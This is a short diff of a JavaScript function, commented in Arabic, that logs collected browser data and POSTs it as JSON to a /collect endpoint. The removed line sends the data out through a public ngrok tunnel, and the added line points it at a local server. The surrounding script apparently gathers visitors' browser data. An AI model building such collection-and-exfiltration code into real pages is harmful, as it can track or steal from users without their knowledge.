@@ -137,7 +137,7 @@ const sendData = async () => {
         console.log('بيانات المتصفح:', browserData);
 
         // إرسال البيانات إلى السيرفر المحلي
-        const response = await fetch('https://0988-41-111-51-231.ngrok-free.app/collect', {
+        const response = await fetch('http://127.0.0.1:5000/collect', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(browserData)
